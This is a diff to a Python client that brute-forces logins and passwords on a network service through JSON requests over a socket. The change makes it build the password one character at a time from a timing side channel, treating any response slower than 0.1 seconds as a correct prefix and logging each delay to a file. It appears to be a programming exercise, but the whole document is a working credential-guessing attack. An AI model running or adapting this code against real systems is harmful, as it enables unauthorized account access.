@@ -1,12 +1,14 @@
 import argparse
 
-from itertools import cycle
+import itertools
 
 import json
 
 import socket
 
 import string
+
+from time import time
 
 BUF_SIZE = 1024
 ALL_SYMBOLS = string.ascii_letters + string.digits
@@ -20,7 +22,7 @@ def get_new_line():
 
 def pass_gen_v3(word=''):
     global ALL_SYMBOLS
-    a = cycle(ALL_SYMBOLS)
+    a = itertools.cycle(ALL_SYMBOLS)
     for i in a:
         yield word + i
 
@@ -29,7 +31,6 @@ parser = argparse.ArgumentParser()
 parser.add_argument('ip_address')
 parser.add_argument('port')
 args = parser.parse_args()
-m = 0
 
 login_gen = get_new_line()
 login = next(login_gen)
@@ -42,7 +43,9 @@ with socket.socket() as client_socket:
         request['login'] = login
         request_json = json.dumps(request, indent=4)
         client_socket.send(request_json.encode('utf-8'))
+
         response_json = client_socket.recv(BUF_SIZE).decode()
+
         response = json.loads(response_json)
         if response['result'] == 'Wrong password!':
             break
@@ -57,9 +60,14 @@ with socket.socket() as client_socket:
         request['password'] = password
         request_json = json.dumps(request, indent=4)
         client_socket.send(request_json.encode('utf-8'))
+        start = time()
         response_json = client_socket.recv(BUF_SIZE).decode()
+        end = time()
+        delay = end - start
+        with open('delays.txt', 'a') as file:
+            file.write(str(delay) + '\n')
         response = json.loads(response_json)
-        if response['result'] == 'Exception happened during login':
+        if delay > 0.1:
             pass_gen = pass_gen_v3(password)
             password = next(pass_gen)
             continue
